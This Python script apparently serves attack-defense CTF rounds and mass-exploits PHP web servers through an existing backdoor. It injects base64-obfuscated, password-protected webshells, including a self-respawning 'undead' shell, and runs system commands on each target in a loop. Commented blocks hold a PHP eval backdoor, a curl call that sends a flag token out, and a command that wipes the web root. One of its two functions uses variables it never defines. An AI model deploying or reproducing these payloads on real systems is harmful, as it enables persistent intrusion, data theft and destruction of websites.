import requests
import time


def mingling(shijian, xuan1, xuan2):
    lun = 0
    while (1):
        lun = lun + 1
        print("第" + str(lun) + "轮")
        for i in range(1, 2):
            if i == 13:  # 跳过自己地址
                continue
            url = ''

            '''data = {
                'd': 'system',
                'c': 'curl http://flagserver/flag?token=NSS_FHPTWK'
            }'''
            '''对应的后门利用
            <?php 
    echo 'hello world';
    extract($_REQUEST);
    @$d($_POST[c]);
    ?>
            '''

            '''执行命令模块
            '''

            # 攻击模块
            '''
            data = {
                'a': 'system("ls /");'
            }
            a = requests.post(url=url, data=data)
            if "bin" in a.text:
                print("命令执行 success 第" + str(i) + "个")
            else:
                print("命令执行 失败 第" + str(i) + "个")
                print(a.text)
                '''
            ma = '$a = base64_decode("JGEgPSAiUEQ5d2FIQWdaWEp5YjNKZmNtVndiM0owYVc1bktEQXBPeUFLWldOb2J5QWlQR2d4UGtoaFkyc2dZbmtnU2twS1NreE1URXc4TDJneFBpSTdJQXBwWmlodFpEVW9KRjlRVDFOVVd5ZHdZWE56SjEwcFBUMDlKelpoT0dRMVpUSTFORFk0TldZM056ZzJaRFV3TURFNE1EQXlNbVprT1daa0p5a0tlMlZqYUc4Z0luQmhjM04zYjNKa0lHbHpJSFJ5ZFdVaU93cEFaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnZlNBS1pXeHpaUXA3WldOb2J5QWljR0Z6YzNkdmNtUWdhWE1nWm14aGMyVWlPd3A5SUNBL1BnPT0iOyAkYSA9IGJhc2U2NF9kZWNvZGUoJGEpO2VjaG8gJGE7ZmlsZV9wdXRfY29udGVudHMoIi4vLmNvbmZpZy5waHAiLCRhKTs=");eval("$a");'
            if xuan1 == 1:
                data = {
                    'a': ma
                }
                a = requests.post(url=url, data=data)
                if "Hack by JJJJLLLL" in a.text:
                    print("加密木马写入成功，文件为 .config.php密码：  j@l#cyhui6*(^66 ")
                else:
                    print("加密木马写入失败")


            if xuan2 == 1:
                data = {
                    'a': busima
                }
                a = requests.post(url=url, data=data)
                timeout_seconds = 3
                try:
                    b = requests.get(url=url0 + ".buconfig.php", data=data,timeout=timeout_seconds)
                except requests.Timeout:
                    # 响应超时
                    print("访问不死马文件来触发")
                except requests.RequestException as e:
                    # 其他请求异常
                    print(f"请求异常: {str(e)}")
                c = requests.get(url=url0 + ".buuconfig.php", data=data)
                if "Hack by JJJJLLLL" in c.text:
                    print("不死马写入成功，文件为 .buconfig.php 不死马写的加密后门文件为.buuconfig.php 密码：  j@l#cyhui6*(^66 ")
                else:
                    print("不死马写入失败")
            data = {
                'a': 'system("ls /");'
            }
            a = requests.post(url=url, data=data)
            if "bin" in a.text:
                print("命令执行 success 第" + str(i) + "个")
            else:
                print("命令执行 失败 第" + str(i) + "个")
                print(a.text)

            data = {
                'a': 'system("ls /");'
            }
            a = requests.post(url=url, data=data)
            if "bin" in a.text:
                print("命令执行 success 第" + str(i) + "个")
            else:
                print("命令执行 失败 第" + str(i) + "个")
                print(a.text)

            # 删站模块
            '''
            data = {
                'd': 'system',
                'c': 'rm -rf /var/www/html/*'
            }
            a = requests.post(url=url, data=data)
            if "bin" in a.text:
                print("命令执行 success 第" + str(i) + "个")
            else:
                print("命令执行 失败 第" + str(i) + "个")
                print(a.text)
                '''

            time.sleep(shijian)  # 让攻击缓一缓，根据自己来调


def wenjian(shijian, xuan1, xuan2):  # 如果环境的地址没有规律，将地址放到文件里

    file_path = 'url.txt'  # 文件路径

    # 打开文件
    with open(file_path, 'r') as file:
        # 初始化数组变量
        lines = []

        # 逐行读取文件
        for line in file:
            # 去除每行末尾的换行符并添加到数组变量中
            lines.append(line.rstrip('\n'))

    # 打印数组变量内容
    # for line in lines:
    #    print(line)
    selfurl = ''  # 自己的url
    lun = 0
    while (1):
        lun = lun + 1
        print("第" + str(lun) + "轮")
        i = 0
        for line in lines:
            if line == selfurl:  # 跳过自己地址
                continue
            i = i + 1
            url0 = line
            url = url0 + "e8.php"
            '''data = {
                'd': 'system',
                'c': 'curl http://flagserver/flag?token=NSS_FHPTWK'
            }'''
            '''对应的后门利用
            <?php 
    echo 'hello world';
    extract($_REQUEST);
    @$d($_POST[c]);
    ?>
            '''

            '''执行命令模块
            '''

            # 攻击模块
            '''
            data = {
                'a': 'system("ls /");'
            }
            a = requests.post(url=url, data=data)
            if "bin" in a.text:
                print("命令执行 success 第" + str(i) + "个")
            else:
                print("命令执行 失败 第" + str(i) + "个")
                print(a.text)
                '''

            ma = '$a = base64_decode("JGEgPSAiUEQ5d2FIQWdaWEp5YjNKZmNtVndiM0owYVc1bktEQXBPeUFLWldOb2J5QWlQR2d4UGtoaFkyc2dZbmtnU2twS1NreE1URXc4TDJneFBpSTdJQXBwWmlodFpEVW9KRjlRVDFOVVd5ZHdZWE56SjEwcFBUMDlKelpoT0dRMVpUSTFORFk0TldZM056ZzJaRFV3TURFNE1EQXlNbVprT1daa0p5a0tlMlZqYUc4Z0luQmhjM04zYjNKa0lHbHpJSFJ5ZFdVaU93cEFaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnZlNBS1pXeHpaUXA3WldOb2J5QWljR0Z6YzNkdmNtUWdhWE1nWm14aGMyVWlPd3A5SUNBL1BnPT0iOyAkYSA9IGJhc2U2NF9kZWNvZGUoJGEpO2VjaG8gJGE7ZmlsZV9wdXRfY29udGVudHMoIi4vLmNvbmZpZy5waHAiLCRhKTs=");eval("$a");'
            if xuan1 == 1:
                data = {
                    'a': ma
                }
                a = requests.post(url=url, data=data)
                if "Hack by JJJJLLLL" in a.text:
                    print("加密木马写入成功，文件为 .config.php密码：  j@l#cyhui6*(^66 ")
                else:
                    print("加密木马写入失败")
            else:
                print("未写入加密木马")
            busima = '$a = base64_decode("JGEgPSAiUEQ5d2FIQUtjMlYwWDNScGJXVmZiR2x0YVhRb01DazdDbWxuYm05eVpWOTFjMlZ5WDJGaWIzSjBLREVwT3dwMWJteHBibXNvWDE5R1NVeEZYMThwT3dvS2QyaHBiR1VvTVNsN0NpQWdJQ0JsZG1Gc0tDY2tZU0E5SUdKaGMyVTJORjlrWldOdlpHVW9Ja3BIUldkUVUwRnBWVVZSTldReVJrbFJWMlJoVjBWd05WbHFUa3RhYlU1MFZtNWthVTB3YjNkWlZtTXhZbXQwUlZGWVFsQmxWVVpNVjJ4a1QySXlTalZSVjJ4UlVqSmtORlZIZEc5aFJtdDVZekprV21KdGRHNVZNblIzVXpGT2NtVkZNVlZTV0dNMFZFUktibVZHUW5CVFZHUktVVmhDZDFkdGJHOWtSbkJGVmxjNVMxSnFiRkpXUkVaUFZsWmtOVnBJWkZwWFJUVTJVMnBGZDJOR1FsVk5SR3hMWld4d2IxUXdaRkpOVm5CVlUxUkdUMUpHYXpCVWJHUmFUVEExTmxwNlNtRlNSbFl6VkZWU1JrNUZNVVZSV0d4T1lsWndjbFF4WkdGaE1IQTFZVEIwYkUxc1duRlpWV00wV2pCc2RWRnRhR3BOTURSNldXcE9TMkV3YkVoaVNIQktVMFpLTlZwR1pGWmhWVGt6WTBWR1lWZEdjRzlaYTA1dVlURm5lRkZzUWxaTlZrcHBVMnBLVDJSR2NFUmFSMUpNVmtoT2JscHNUa0pUTVhCWVpVaHdZVlZZUVROWGJHUlBZakpLTlZGWGJHcFNNRm8yV1hwT2EyUnRUblJWVjJSb1YwVXhibGR0TVRSaFIwMTVWbGRzVUdRelFUVlRWVTVDVERGQ2JsQlVNR2xQZVVGcldWTkJPVWxIU21oak1sVXlUa1k1YTFwWFRuWmFSMVZ2U2tkRmNFOHlWbXBoUnpoblNrZEZOMXB0YkhOYVZqbDNaRmhTWmxreU9YVmtSMVoxWkVoTmIwbHBOSFpNYlVveFpGZE9kbUp0V25CYWVUVjNZVWhCYVV4RFVtaExWSE05SWlrN1pYWmhiQ2dpSkdFaUtUc25LVHNLSUNBZ0lITjVjM1JsYlNnblkyaHRiMlFnTnpjM0lDNWlkV052Ym1acFp5NXdhSEFuS1RzZ0NpQWdJQ0IwYjNWamFDZ2lMbUoxWTI5dVptbG5MbkJvY0NJc0lHMXJkR2x0WlNneU1Dd3hOU3d4TERFeExERTNMREl3TVRjcEtUc2dDblZ6YkdWbGNDZ3hNREFwT3dwOVB6ND0iOyAkYSA9IGJhc2U2NF9kZWNvZGUoJGEpO2VjaG8gJGE7ZmlsZV9wdXRfY29udGVudHMoIi4vLmJ1Y29uZmlnLnBocCIsJGEpOw==");eval("$a");'
            if xuan2 == 1:
                data = {
                    'a': busima
                }
                a = requests.post(url=url, data=data)
                timeout_seconds = 3
                try:
                    b = requests.get(url=url0 + ".buconfig.php", data=data,timeout=timeout_seconds)
                except requests.Timeout:
                    # 响应超时
                    print("访问不死马文件来触发")
                except requests.RequestException as e:
                    # 其他请求异常
                    print(f"请求异常: {str(e)}")
                c = requests.get(url=url0 + ".buuconfig.php", data=data)
                if "Hack by JJJJLLLL" in c.text:
                    print("不死马写入成功，文件为 .buconfig.php 不死马写的加密后门文件为.buuconfig.php 密码：  j@l#cyhui6*(^66 ")
                else:
                    print("不死马写入失败")
            data = {
                'a': 'system("ls /");'
            }
            a = requests.post(url=url, data=data)
            if "bin" in a.text:
                print("命令执行 success 第" + str(i) + "个")
            else:
                print("命令执行 失败 第" + str(i) + "个")
                print(a.text)

            # 删站模块
            '''
            data = {
                'd': 'system',
                'c': 'rm -rf /var/www/html/*'
            }
            a = requests.post(url=url, data=data)
            if "bin" in a.text:
                print("命令执行 success 第" + str(i) + "个")
            else:
                print("命令执行 失败 第" + str(i) + "个")
                print(a.text)
                '''

            time.sleep(shijian)  # 让攻击缓一缓，根据自己来调


# 从用户获取输入并存储在变量中
user_input = input("请输入是从文件读入url（1）还是从有规律的自己存入的（2）：")
shijian = eval(input("请输入每次攻击的间隔时间"))
xuan1 = eval(input("是否写入加密木马"))
xuan2 = eval(input("是否写入不死马"))
if eval(user_input) == 2:
    print("确保你已在上边代码中加入了靶机url")
    mingling(shijian, xuan1, xuan2)
elif eval(user_input) == 1:
    print("从文件读入")
    wenjian(shijian, xuan1, xuan2)

